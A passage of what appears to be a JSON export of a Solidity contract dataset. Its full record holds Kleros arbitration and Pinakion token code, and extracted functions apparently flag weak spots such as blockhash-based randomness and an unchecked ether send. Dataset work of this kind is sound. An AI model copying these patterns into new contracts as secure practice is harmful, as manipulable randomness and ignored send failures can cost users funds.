    "function totalSupply() public constant returns (uint) {\nreturn totalSupplyAt(block.number);\n}",
    "function saveRN(uint _block) public {\nif (_block<block.number && randomNumber[_block]==0) {\nif (blockhash(_block)!=0x0)\nrandomNumber[_block]=uint(blockhash(_block));\nelse\nrandomNumber[_block]=uint(blockhash(block.number-1));\n}\nif (randomNumber[_block] != 0) {\nuint rewardToSend=reward[_block];\nreward[_block]=0;\nmsg.sender.send(rewardToSend);\n}\n}",
    "function passPeriod() public {\nrequire(now-lastPeriodChange >= timePerPeriod[uint8(period)]);\nif (period == Period.Activation) {\nrnBlock = block.number + 1;\nrng.requestRN(rnBlock);\nperiod = Period.Draw;\n} else if (period == Period.Draw) {\nrandomNumber = rng.getUncorrelatedRN(rnBlock);\nrequire(randomNumber != 0);\nperiod = Period.Vote;\n} else if (period == Period.Vote) {\nperiod = Period.Appeal;\n} else if (period == Period.Appeal) {\nperiod = Period.Execution;\n} else if (period == Period.Execution) {\nperiod = Period.Activation;\n++session;\nsegmentSize = 0;\nrnBlock = 0;\nrandomNumber = 0;\n}\nlastPeriodChange = now;\nNewPeriod(period, session);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b44"
  },
  "filename": "2307.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract TokenController {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public\n returns(bool);\n}\ncontract Controlled {\n modifier onlyController { require(msg.sender == controller); _; }\n address public controller;\n function Controlled() public { controller = msg.sender;}\n function changeController(address _newController) public onlyController {\n controller = _newController;\n }\n}\ncontract Pinakion is Controlled {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'MMT_0.2';\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n Pinakion public parentToken;\n uint public parentSnapShotBlock;\n uint public creationBlock;\n mapping (address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint256)) allowed;\n Checkpoint[] totalSupplyHistory;\n bool public transfersEnabled;\n MiniMeTokenFactory public tokenFactory;\n function Pinakion(\n address _tokenFactory,\n address _parentToken,\n uint _parentSnapShotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public {\n tokenFactory = MiniMeTokenFactory(_tokenFactory);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n parentToken = Pinakion(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n transfersEnabled = _transfersEnabled;\n creationBlock = block.number;\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n doTransfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount\n ) public returns (bool success) {\n if (msg.sender != controller) {\n require(transfersEnabled);\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n }\n doTransfer(_from, _to, _amount);\n return true;\n }\n function doTransfer(address _from, address _to, uint _amount\n ) internal {\n if (_amount == 0) {\n Transfer(_from, _to, _amount);\n return;\n }\n require(parentSnapShotBlock < block.number);\n require((_to != 0) && (_to != address(this)));\n var previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom >= _amount);\n if (isContract(controller)) {\n require(TokenController(controller).onTransfer(_from, _to, _amount));\n }\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n var previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n Transfer(_from, _to, _amount);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n if (isContract(controller)) {\n require(TokenController(controller).onApprove(msg.sender, _spender, _amount));\n }\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender\n ) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData\n ) public returns (bool success) {\n require(approve(_spender, _amount));\n ApproveAndCallFallBack(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function totalSupply() public constant returns (uint) {\n return totalSupplyAt(block.number);\n }\n function balanceOfAt(address _owner, uint _blockNumber) public constant\n returns (uint) {\n if ((balances[_owner].length == 0)\n || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function totalSupplyAt(uint _blockNumber) public constant returns(uint) {\n if ((totalSupplyHistory.length == 0)\n || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function createCloneToken(\n string _cloneTokenName,\n uint8 _cloneDecimalUnits,\n string _cloneTokenSymbol,\n uint _snapshotBlock,\n bool _transfersEnabled\n ) public returns(address) {\n if (_snapshotBlock == 0) _snapshotBlock = block.number;\n Pinakion cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _cloneTokenName,\n _cloneDecimalUnits,\n _cloneTokenSymbol,\n _transfersEnabled\n );\n cloneToken.changeController(msg.sender);\n NewCloneToken(address(cloneToken), _snapshotBlock);\n return address(cloneToken);\n }\n function generateTokens(address _owner, uint _amount\n ) public onlyController returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply + _amount >= curTotalSupply);\n uint previousBalanceTo = balanceOf(_owner);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n Transfer(0, _owner, _amount);\n return true;\n }\n function destroyTokens(address _owner, uint _amount\n ) onlyController public returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply >= _amount);\n uint previousBalanceFrom = balanceOf(_owner);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\n updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\n Transfer(_owner, 0, _amount);\n return true;\n }\n function enableTransfers(bool _transfersEnabled) public onlyController {\n transfersEnabled = _transfersEnabled;\n }\n function getValueAt(Checkpoint[] storage checkpoints, uint _block\n ) constant internal returns (uint) {\n if (checkpoints.length == 0) return 0;\n if (_block >= checkpoints[checkpoints.length-1].fromBlock)\n return checkpoints[checkpoints.length-1].value;\n if (_block < checkpoints[0].fromBlock) return 0;\n uint min = 0;\n uint max = checkpoints.length-1;\n while (max > min) {\n uint mid = (max + min + 1)/ 2;\n if (checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\n ) internal {\n if ((checkpoints.length == 0)\n || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0) return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n function min(uint a, uint b) pure internal returns (uint) {\n return a < b ? a : b;\n }\n function () public payable {\n require(isContract(controller));\n require(TokenController(controller).proxyPayment.value(msg.value)(msg.sender));\n }\n function claimTokens(address _token) public onlyController {\n if (_token == 0x0) {\n controller.transfer(this.balance);\n return;\n }\n Pinakion token = Pinakion(_token);\n uint balance = token.balanceOf(this);\n token.transfer(controller, balance);\n ClaimedTokens(_token, controller, balance);\n }\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract MiniMeTokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public returns (Pinakion) {\n Pinakion newToken = new Pinakion(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _decimalUnits,\n _tokenSymbol,\n _transfersEnabled\n );\n newToken.changeController(msg.sender);\n return newToken;\n }\n}\ncontract RNG{\n function contribute(uint _block) public payable;\n function requestRN(uint _block) public payable {\n contribute(_block);\n }\n function getRN(uint _block) public returns (uint RN);\n function getUncorrelatedRN(uint _block) public returns (uint RN) {\n uint baseRN=getRN(_block);\n if (baseRN==0)\n return 0;\n else\n return uint(keccak256(msg.sender,baseRN));\n }\n }\ncontract BlockHashRNG is RNG {\n mapping (uint => uint) public randomNumber;\n mapping (uint => uint) public reward;\n function contribute(uint _block) public payable { reward[_block]+=msg.value; }\n function getRN(uint _block) public returns (uint RN) {\n RN=randomNumber[_block];\n if (RN==0){\n saveRN(_block);\n return randomNumber[_block];\n }\n else\n return RN;\n }\n function saveRN(uint _block) public {\n if (blockhash(_block) != 0x0)\n randomNumber[_block] = uint(blockhash(_block));\n if (randomNumber[_block] != 0) {\n uint rewardToSend = reward[_block];\n reward[_block] = 0;\n msg.sender.send(rewardToSend);\n }\n }\n}\ncontract BlockHashRNGFallback is BlockHashRNG {\n function saveRN(uint _block) public {\n if (_block<block.number && randomNumber[_block]==0) {\n if (blockhash(_block)!=0x0)\n randomNumber[_block]=uint(blockhash(_block));\n else\n randomNumber[_block]=uint(blockhash(block.number-1));\n }\n if (randomNumber[_block] != 0) {\n uint rewardToSend=reward[_block];\n reward[_block]=0;\n msg.sender.send(rewardToSend);\n }\n }\n}\ncontract Arbitrable{\n Arbitrator public arbitrator;\n bytes public arbitratorExtraData;\n modifier onlyArbitrator {require(msg.sender==address(arbitrator)); _;}\n event Ruling(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _ruling);\n event MetaEvidence(uint indexed _metaEvidenceID, string _evidence);\n event Dispute(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _metaEvidenceID);\n event Evidence(Arbitrator indexed _arbitrator, uint indexed _disputeID, address _party, string _evidence);\n constructor(Arbitrator _arbitrator, bytes _arbitratorExtraData) public {\n arbitrator = _arbitrator;\n arbitratorExtraData = _arbitratorExtraData;\n }\n function rule(uint _disputeID, uint _ruling) public onlyArbitrator {\n emit Ruling(Arbitrator(msg.sender),_disputeID,_ruling);\n executeRuling(_disputeID,_ruling);\n }\n function executeRuling(uint _disputeID, uint _ruling) internal;\n}\ncontract Arbitrator{\n enum DisputeStatus {Waiting, Appealable, Solved}\n modifier requireArbitrationFee(bytes _extraData) {require(msg.value>=arbitrationCost(_extraData)); _;}\n modifier requireAppealFee(uint _disputeID, bytes _extraData) {require(msg.value>=appealCost(_disputeID, _extraData)); _;}\n event AppealPossible(uint _disputeID);\n event DisputeCreation(uint indexed _disputeID, Arbitrable _arbitrable);\n event AppealDecision(uint indexed _disputeID, Arbitrable _arbitrable);\n function createDispute(uint _choices, bytes _extraData) public requireArbitrationFee(_extraData) payable returns(uint disputeID) {}\n function arbitrationCost(bytes _extraData) public constant returns(uint fee);\n function appeal(uint _disputeID, bytes _extraData) public requireAppealFee(_disputeID,_extraData) payable {\n emit AppealDecision(_disputeID, Arbitrable(msg.sender));\n }\n function appealCost(uint _disputeID, bytes _extraData) public constant returns(uint fee);\n function disputeStatus(uint _disputeID) public constant returns(DisputeStatus status);\n function currentRuling(uint _disputeID) public constant returns(uint ruling);\n}\ncontract Kleros is Arbitrator, ApproveAndCallFallBack {\n Pinakion public pinakion;\n uint public constant NON_PAYABLE_AMOUNT = (2**256 - 2) / 2;\n RNG public rng;\n uint public arbitrationFeePerJuror = 0.05 ether;\n uint16 public defaultNumberJuror = 3;\n uint public minActivatedToken = 0.1 * 1e18;\n uint[5] public timePerPeriod;\n uint public alpha = 2000;\n uint constant ALPHA_DIVISOR = 1e4;\n uint public maxAppeals = 5;\n address public governor;\n uint public session = 1;\n uint public lastPeriodChange;\n uint public segmentSize;\n uint public rnBlock;\n uint public randomNumber;\n enum Period {\n Activation,\n Draw,\n Vote,\n Appeal,\n Execution\n }\n Period public period;\n struct Juror {\n uint balance;\n uint atStake;\n uint lastSession;\n uint segmentStart;\n uint segmentEnd;\n }\n mapping (address => Juror) public jurors;\n struct Vote {\n address account;\n uint ruling;\n }\n struct VoteCounter {\n uint winningChoice;\n uint winningCount;\n mapping (uint => uint) voteCount;\n }\n enum DisputeState {\n Open,\n Resolving,\n Executable,\n Executed\n }\n struct Dispute {\n Arbitrable arbitrated;\n uint session;\n uint appeals;\n uint choices;\n uint16 initialNumberJurors;\n uint arbitrationFeePerJuror;\n DisputeState state;\n Vote[][] votes;\n VoteCounter[] voteCounter;\n mapping (address => uint) lastSessionVote;\n uint currentAppealToRepartition;\n AppealsRepartitioned[] appealsRepartitioned;\n }\n enum RepartitionStage {\n Incoherent,\n Coherent,\n AtStake,\n Complete\n }\n struct AppealsRepartitioned {\n uint totalToRedistribute;\n uint nbCoherent;\n uint currentIncoherentVote;\n uint currentCoherentVote;\n uint currentAtStakeVote;\n RepartitionStage stage;\n }\n Dispute[] public disputes;\n event NewPeriod(Period _period, uint indexed _session);\n event TokenShift(address indexed _account, uint _disputeID, int _amount);\n event ArbitrationReward(address indexed _account, uint _disputeID, uint _amount);\n modifier onlyBy(address _account) {require(msg.sender == _account); _;}\n modifier onlyDuring(Period _period) {require(period == _period); _;}\n modifier onlyGovernor() {require(msg.sender == governor); _;}\n constructor(Pinakion _pinakion, RNG _rng, uint[5] _timePerPeriod, address _governor) public {\n pinakion = _pinakion;\n rng = _rng;\n lastPeriodChange = now;\n timePerPeriod = _timePerPeriod;\n governor = _governor;\n }\n function receiveApproval(address _from, uint _amount, address, bytes) public onlyBy(pinakion) {\n require(pinakion.transferFrom(_from, this, _amount));\n jurors[_from].balance += _amount;\n }\n function withdraw(uint _value) public {\n Juror storage juror = jurors[msg.sender];\n require(juror.atStake <= juror.balance);\n require(_value <= juror.balance-juror.atStake);\n require(juror.lastSession != session);\n juror.balance -= _value;\n require(pinakion.transfer(msg.sender,_value));\n }\n function passPeriod() public {\n require(now-lastPeriodChange >= timePerPeriod[uint8(period)]);\n if (period == Period.Activation) {\n rnBlock = block.number + 1;\n rng.requestRN(rnBlock);\n period = Period.Draw;\n } else if (period == Period.Draw) {\n randomNumber = rng.getUncorrelatedRN(rnBlock);\n require(randomNumber != 0);\n period = Period.Vote;\n } else if (period == Period.Vote) {\n period = Period.Appeal;\n } else if (period == Period.Appeal) {\n period = Period.Execution;\n } else if (period == Period.Execution) {\n period = Period.Activation;\n ++session;\n segmentSize = 0;\n rnBlock = 0;\n randomNumber = 0;\n }\n lastPeriodChange = now;\n NewPeriod(period, session);\n }\n function activateTokens(uint _value) public onlyDuring(Period.Activation) {\n Juror storage juror = jurors[msg.sender];\n require(_value <= juror.balance);\n require(_value >= minActivatedToken);\n require(juror.lastSession != session);\n juror.lastSession = session;\n juror.segmentStart = segmentSize;\n segmentSize += _value;\n juror.segmentEnd = segmentSize;\n }\n function voteRuling(uint _disputeID, uint _ruling, uint[] _draws) public onlyDuring(Period.Vote) {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage juror = jurors[msg.sender];\n VoteCounter storage voteCounter = dispute.voteCounter[dispute.appeals];\n require(dispute.lastSessionVote[msg.sender] != session);\n require(_ruling <= dispute.choices);\n require(validDraws(msg.sender, _disputeID, _draws));\n dispute.lastSessionVote[msg.sender] = session;\n voteCounter.voteCount[_ruling] += _draws.length;\n if (voteCounter.winningCount < voteCounter.voteCount[_ruling]) {\n voteCounter.winningCount = voteCounter.voteCount[_ruling];\n voteCounter.winningChoice = _ruling;\n } else if (voteCounter.winningCount==voteCounter.voteCount[_ruling] && _draws.length!=0) {\n voteCounter.winningChoice = 0;\n }\n for (uint i = 0; i < _draws.length; ++i) {\n dispute.votes[dispute.appeals].push(Vote({\n account: msg.sender,\n ruling: _ruling\n }));\n }\n juror.atStake += _draws.length * getStakePerDraw();\n uint feeToPay = _draws.length * dispute.arbitrationFeePerJuror;\n msg.sender.transfer(feeToPay);\n ArbitrationReward(msg.sender, _disputeID, feeToPay);\n }\n function penalizeInactiveJuror(address _jurorAddress, uint _disputeID, uint[] _draws) public {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage inactiveJuror = jurors[_jurorAddress];\n require(period > Period.Vote);\n require(dispute.lastSessionVote[_jurorAddress] != session);\n dispute.lastSessionVote[_jurorAddress] = session;\n require(validDraws(_jurorAddress, _disputeID, _draws));\n uint penality = _draws.length * minActivatedToken * 2 * alpha / ALPHA_DIVISOR;\n penality = (penality < inactiveJuror.balance) ? penality : inactiveJuror.balance;\n inactiveJuror.balance -= penality;\n TokenShift(_jurorAddress, _disputeID, -int(penality));\n jurors[msg.sender].balance += penality / 2;\n TokenShift(msg.sender, _disputeID, int(penality / 2));\n jurors[governor].balance += penality / 2;\n TokenShift(governor, _disputeID, int(penality / 2));\n msg.sender.transfer(_draws.length*dispute.arbitrationFeePerJuror);\n }\n function oneShotTokenRepartition(uint _disputeID) public onlyDuring(Period.Execution) {\n Dispute storage dispute = disputes[_disputeID];\n require(dispute.state == DisputeState.Open);\n require(dispute.session+dispute.appeals <= session);\n uint winningChoice = dispute.voteCounter[dispute.appeals].winningChoice;\n uint amountShift = getStakePerDraw();\n for (uint i = 0; i <= dispute.appeals; ++i) {\n if (winningChoice!=0 || (dispute.voteCounter[dispute.appeals].voteCount[0] == dispute.voteCounter[dispute.appeals].winningCount)) {\n uint totalToRedistribute = 0;\n uint nbCoherent = 0;\n for (uint j = 0; j < dispute.votes[i].length; ++j) {\n Vote storage vote = dispute.votes[i][j];\n if (vote.ruling != winningChoice) {\n Juror storage juror = jurors[vote.account];\n uint penalty = amountShift<juror.balance ? amountShift : juror.balance;\n juror.balance -= penalty;\n TokenShift(vote.account, _disputeID, int(-penalty));\n totalToRedistribute += penalty;\n } else {\n ++nbCoherent;\n }\n }\n if (nbCoherent == 0) {\n jurors[governor].balance += totalToRedistribute;\n TokenShift(governor, _disputeID, int(totalToRedistribute));\n } else {\n uint toRedistribute = totalToRedistribute / nbCoherent;\n for (j = 0; j < dispute.votes[i].length; ++j) {\n vote = dispute.votes[i][j];\n if (vote.ruling == winningChoice) {\n juror = jurors[vote.account];\n juror.balance += toRedistribute;\n TokenShift(vote.account, _disputeID, int(toRedistribute));\n }\n }\n }\n }\n for (j = 0; j < dispute.votes[i].length; ++j) {\n vote = dispute.votes[i][j];\n juror = jurors[vote.account];\n juror.atStake -= amountShift;\n }\n }\n dispute.state = DisputeState.Executable;\n }\n function multipleShotTokenRepartition(uint _disputeID, uint _maxIterations) public onlyDuring(Period.Execution) {\n Dispute storage dispute = disputes[_disputeID];\n require(dispute.state <= DisputeState.Resolving);\n require(dispute.session+dispute.appeals <= session);\n dispute.state = DisputeState.Resolving;\n uint winningChoice = dispute.voteCounter[dispute.appeals].winningChoice;\n uint amountShift = getStakePerDraw();\n uint currentIterations = 0;\n for (uint i = dispute.currentAppealToRepartition; i <= dispute.appeals; ++i) {\n if (dispute.appealsRepartitioned.length < i+1) {\n dispute.appealsRepartitioned.length++;\n }\n if (winningChoice==0 && (dispute.voteCounter[dispute.appeals].voteCount[0] != dispute.voteCounter[dispute.appeals].winningCount)) {\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Incoherent) {\n for (uint j = dispute.appealsRepartitioned[i].currentIncoherentVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n Vote storage vote = dispute.votes[i][j];\n if (vote.ruling != winningChoice) {\n Juror storage juror = jurors[vote.account];\n uint penalty = amountShift<juror.balance ? amountShift : juror.balance;\n juror.balance -= penalty;\n TokenShift(vote.account, _disputeID, int(-penalty));\n dispute.appealsRepartitioned[i].totalToRedistribute += penalty;\n } else {\n ++dispute.appealsRepartitioned[i].nbCoherent;\n }\n ++dispute.appealsRepartitioned[i].currentIncoherentVote;\n ++currentIterations;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.Coherent;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Coherent) {\n if (dispute.appealsRepartitioned[i].nbCoherent == 0) {\n jurors[governor].balance += dispute.appealsRepartitioned[i].totalToRedistribute;\n TokenShift(governor, _disputeID, int(dispute.appealsRepartitioned[i].totalToRedistribute));\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n } else {\n uint toRedistribute = dispute.appealsRepartitioned[i].totalToRedistribute / dispute.appealsRepartitioned[i].nbCoherent;\n for (j = dispute.appealsRepartitioned[i].currentCoherentVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n vote = dispute.votes[i][j];\n if (vote.ruling == winningChoice) {\n juror = jurors[vote.account];\n juror.balance += toRedistribute;\n TokenShift(vote.account, _disputeID, int(toRedistribute));\n }\n ++currentIterations;\n ++dispute.appealsRepartitioned[i].currentCoherentVote;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n }\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.AtStake) {\n for (j = dispute.appealsRepartitioned[i].currentAtStakeVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n vote = dispute.votes[i][j];\n juror = jurors[vote.account];\n juror.atStake -= amountShift;\n ++currentIterations;\n ++dispute.appealsRepartitioned[i].currentAtStakeVote;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.Complete;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Complete) {\n ++dispute.currentAppealToRepartition;\n }\n }\n dispute.state = DisputeState.Executable;\n }\n function amountJurors(uint _disputeID) public view returns (uint nbJurors) {\n Dispute storage dispute = disputes[_disputeID];\n return (dispute.initialNumberJurors + 1) * 2**dispute.appeals - 1;\n }\n function validDraws(address _jurorAddress, uint _disputeID, uint[] _draws) public view returns (bool valid) {\n uint draw = 0;\n Juror storage juror = jurors[_jurorAddress];\n Dispute storage dispute = disputes[_disputeID];\n uint nbJurors = amountJurors(_disputeID);\n if (juror.lastSession != session) return false;\n if (dispute.session+dispute.appeals != session) return false;\n if (period <= Period.Draw) return false;\n for (uint i = 0; i < _draws.length; ++i) {\n if (_draws[i] <= draw) return false;\n draw = _draws[i];\n if (draw > nbJurors) return false;\n uint position = uint(keccak256(randomNumber, _disputeID, draw)) % segmentSize;\n require(position >= juror.segmentStart);\n require(position < juror.segmentEnd);\n }\n return true;\n }\n function createDispute(uint _choices, bytes _extraData) public payable returns (uint disputeID) {\n uint16 nbJurors = extraDataToNbJurors(_extraData);\n require(msg.value >= arbitrationCost(_extraData));\n disputeID = disputes.length++;\n Dispute storage dispute = disputes[disputeID];\n dispute.arbitrated = Arbitrable(msg.sender);\n if (period < Period.Draw)\n dispute.session = session;\n else\n dispute.session = session+1;\n dispute.choices = _choices;\n dispute.initialNumberJurors = nbJurors;\n dispute.arbitrationFeePerJuror = arbitrationFeePerJuror;\n dispute.votes.length++;\n dispute.voteCounter.length++;\n DisputeCreation(disputeID, Arbitrable(msg.sender));\n return disputeID;\n }\n function appeal(uint _disputeID, bytes _extraData) public payable onlyDuring(Period.Appeal) {\n super.appeal(_disputeID,_extraData);\n Dispute storage dispute = disputes[_disputeID];\n require(msg.value >= appealCost(_disputeID, _extraData));\n require(dispute.session+dispute.appeals == session);\n require(dispute.arbitrated == msg.sender);\n dispute.appeals++;\n dispute.votes.length++;\n dispute.voteCounter.length++;\n }\n function executeRuling(uint disputeID) public {\n Dispute storage dispute = disputes[disputeID];\n require(dispute.state == DisputeState.Executable);\n dispute.state = DisputeState.Executed;\n dispute.arbitrated.rule(disputeID, dispute.voteCounter[dispute.appeals].winningChoice);\n }\n function arbitrationCost(bytes _extraData) public view returns (uint fee) {\n return extraDataToNbJurors(_extraData) * arbitrationFeePerJuror;\n }\n function appealCost(uint _disputeID, bytes _extraData) public view returns (uint fee) {\n Dispute storage dispute = disputes[_disputeID];\n if(dispute.appeals >= maxAppeals) return NON_PAYABLE_AMOUNT;\n return (2*amountJurors(_disputeID) + 1) * dispute.arbitrationFeePerJuror;\n }\n function extraDataToNbJurors(bytes _extraData) internal view returns (uint16 nbJurors) {\n if (_extraData.length < 2)\n return defaultNumberJuror;\n else\n return (uint16(_extraData[0]) << 8) + uint16(_extraData[1]);\n }\n function getStakePerDraw() public view returns (uint minActivatedTokenInAlpha) {\n return (alpha * minActivatedToken) / ALPHA_DIVISOR;\n }\n function getVoteAccount(uint _disputeID, uint _appeals, uint _voteID) public view returns (address account) {\n return disputes[_disputeID].votes[_appeals][_voteID].account;\n }\n function getVoteRuling(uint _disputeID, uint _appeals, uint _voteID) public view returns (uint ruling) {\n return disputes[_disputeID].votes[_appeals][_voteID].ruling;\n }\n function getWinningChoice(uint _disputeID, uint _appeals) public view returns (uint winningChoice) {\n return disputes[_disputeID].voteCounter[_appeals].winningChoice;\n }\n function getWinningCount(uint _disputeID, uint _appeals) public view returns (uint winningCount) {\n return disputes[_disputeID].voteCounter[_appeals].winningCount;\n }\n function getVoteCount(uint _disputeID, uint _appeals, uint _choice) public view returns (uint voteCount) {\n return disputes[_disputeID].voteCounter[_appeals].voteCount[_choice];\n }\n function getLastSessionVote(uint _disputeID, address _juror) public view returns (uint lastSessionVote) {\n return disputes[_disputeID].lastSessionVote[_juror];\n }\n function isDrawn(uint _disputeID, address _juror, uint _draw) public view returns (bool drawn) {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage juror = jurors[_juror];\n if (juror.lastSession != session\n || (dispute.session+dispute.appeals != session)\n || period<=Period.Draw\n || _draw>amountJurors(_disputeID)\n || _draw==0\n || segmentSize==0\n ) {\n return false;\n } else {\n uint position = uint(keccak256(randomNumber,_disputeID,_draw)) % segmentSize;\n return (position >= juror.segmentStart) && (position < juror.segmentEnd);\n }\n }\n function currentRuling(uint _disputeID) public view returns (uint ruling) {\n Dispute storage dispute = disputes[_disputeID];\n return dispute.voteCounter[dispute.appeals].winningChoice;\n }\n function disputeStatus(uint _disputeID) public view returns (DisputeStatus status) {\n Dispute storage dispute = disputes[_disputeID];\n if (dispute.session+dispute.appeals < session)\n return DisputeStatus.Solved;\n else if(dispute.session+dispute.appeals == session) {\n if (dispute.state == DisputeState.Open) {\n if (period < Period.Appeal)\n return DisputeStatus.Waiting;\n else if (period == Period.Appeal)\n return DisputeStatus.Appealable;\n else return DisputeStatus.Solved;\n } else return DisputeStatus.Solved;\n } else return DisputeStatus.Waiting;\n }\n function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {\n _target.call.value(_value)(_data);\n }\n function setRng(RNG _rng) public onlyGovernor {\n rng = _rng;\n }\n function setArbitrationFeePerJuror(uint _arbitrationFeePerJuror) public onlyGovernor {\n arbitrationFeePerJuror = _arbitrationFeePerJuror;\n }\n function setDefaultNumberJuror(uint16 _defaultNumberJuror) public onlyGovernor {\n defaultNumberJuror = _defaultNumberJuror;\n }\n function setMinActivatedToken(uint _minActivatedToken) public onlyGovernor {\n minActivatedToken = _minActivatedToken;\n }\n function setTimePerPeriod(uint[5] _timePerPeriod) public onlyGovernor {\n timePerPeriod = _timePerPeriod;\n }\n function setAlpha(uint _alpha) public onlyGovernor {\n alpha = _alpha;\n }\n function setMaxAppeals(uint _maxAppeals) public onlyGovernor {\n maxAppeals = _maxAppeals;\n }\n function setGovernor(address _governor) public onlyGovernor {\n governor = _governor;\n }\n}",
  "extract_feature": [
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function totalSupply() public constant returns (uint) {\nreturn totalSupplyAt(block.number);\n}",
    "function saveRN(uint _block) public {\nif (_block<block.number && randomNumber[_block]==0) {\nif (blockhash(_block)!=0x0)\nrandomNumber[_block]=uint(blockhash(_block));\nelse\nrandomNumber[_block]=uint(blockhash(block.number-1));\n}\nif (randomNumber[_block] != 0) {\nuint rewardToSend=reward[_block];\nreward[_block]=0;\nmsg.sender.send(rewardToSend);\n}\n}",
    "function passPeriod() public {\nrequire(now-lastPeriodChange >= timePerPeriod[uint8(period)]);\nif (period == Period.Activation) {\nrnBlock = block.number + 1;\nrng.requestRN(rnBlock);\nperiod = Period.Draw;\n} else if (period == Period.Draw) {\nrandomNumber = rng.getUncorrelatedRN(rnBlock);\nrequire(randomNumber != 0);\nperiod = Period.Vote;\n} else if (period == Period.Vote) {\nperiod = Period.Appeal;\n} else if (period == Period.Appeal) {\nperiod = Period.Execution;\n} else if (period == Period.Execution) {\nperiod = Period.Activation;\n++session;\nsegmentSize = 0;\nrnBlock = 0;\nrandomNumber = 0;\n}\nlastPeriodChange = now;\nNewPeriod(period, session);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b45"
  },
  "filename": "2349.sol",
